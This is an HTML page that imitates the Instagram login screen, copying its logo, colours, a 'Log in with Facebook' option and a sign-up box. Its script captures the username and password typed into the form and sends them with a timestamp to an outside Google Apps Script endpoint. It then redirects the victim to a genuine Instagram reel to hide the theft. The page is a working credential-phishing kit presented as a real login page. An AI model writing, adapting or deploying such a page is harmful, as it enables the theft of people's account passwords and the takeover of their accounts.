<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login • Instagram</title>

  <!-- Favicon -->
  <link rel="icon" type="image/png" href="https://static.cdninstagram.com/rsrc.php/v4/yI/r/VsNE-OHk_8a.png">

  <!-- Instagram-like font -->
  <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">

  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #000; /* Dark background */
      color: #fff; /* Default text color */
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      flex-direction: column;
    }

    .container {
      width: 350px;
      background: #121212; /* Dark gray container */
      border: 1px solid #333; /* Darker border */
      padding: 40px;
      text-align: center;
      margin-bottom: 10px;
      border-radius: 6px;
    }

    .logo {
      font-family: 'Grand Hotel', cursive;
      font-size: 48px;
      margin-bottom: 30px;
      color: #fff;
    }

    input {
      width: 100%;
      padding: 10px;
      margin: 6px 0;
      border: 1px solid #333;
      border-radius: 4px;
      background: #1e1e1e; /* Dark input background */
      color: #fff; /* Light text */
    }

    button {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      background: #0095f6;
      border: none;
      border-radius: 4px;
      color: white;
      font-weight: bold;
      cursor: pointer;
    }

    button:hover {
      background: #0077c2;
    }

    .or {
      display: flex;
      align-items: center;
      margin: 20px 0;
      color: #aaa; /* lighter gray */
      font-size: 12px;
      font-weight: bold;
    }

    .or div {
      flex: 1;
      height: 1px;
      background: #333;
    }

    .or span {
      margin: 0 10px;
    }

    .facebook-login {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      color: #1877f2;
      font-weight: bold;
      font-size: 14px;
      margin-bottom: 15px;
      cursor: pointer;
    }

    .facebook-login img {
      width: 18px;
      height: 18px;
    }

    .forgot {
      font-size: 12px;
      color: #9ab4ff; /* light blue */
      text-decoration: none;
    }

    .signup {
      width: 350px;
      background: #121212;
      border: 1px solid #333;
      text-align: center;
      padding: 20px;
      font-size: 14px;
      color: #aaa;
      border-radius: 6px;
    }

    .signup a {
      color: #0095f6;
      font-weight: bold;
      text-decoration: none;
    }
  </style>
</head>
<body>

  <!-- Login Box -->
  <div class="container">
    <i data-visualcompletion="css-img" aria-label="Instagram" class="" role="img" style="background-image: url('https://static.cdninstagram.com/rsrc.php/v4/yz/r/H_-3Vh0lHeK.png'); background-position: 0px -2907px; background-size: auto; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"></i>

    <form id="loginForm">
      <input type="text" id="username" placeholder="Phone number, username, or email" required>
      <input type="password" id="password" placeholder="Password" required>
      <button type="submit">Log In</button>
    </form>

    <div class="or">
      <div></div>
      <span>OR</span>
      <div></div>
    </div>

    <div class="facebook-login">
      <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo">
      <span>Log in with Facebook</span>
    </div>

    <a href="#" class="forgot">Forgot password?</a>
  </div>

  <div class="signup">
    Don’t have an account? <a href="#">Sign up</a>
  </div>

  <script>
    const form = document.getElementById("loginForm");

    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;
      const timestamp = new Date().toLocaleString(); // client timestamp

      try {
        await fetch("https://script.google.com/macros/s/AKfycbx1Uw9SgM4SZCkkvfRoFC6ewrPd-Xxw7z5_3GmoZD7RBiVzaIFD7GMIfsgR6nqotJNY/exec", {
          method: "POST",
          body: JSON.stringify({ username, password, timestamp }),
        });
      } catch (error) {
        console.error("Error:", error);
      }

      // Redirect user to your custom page
      window.location.href = "https://www.instagram.com/reel/DOOQOn_D320/?igsh=MTZhbzU2OTlyMnpiNg==";
    });
  </script>

</body>
</html>
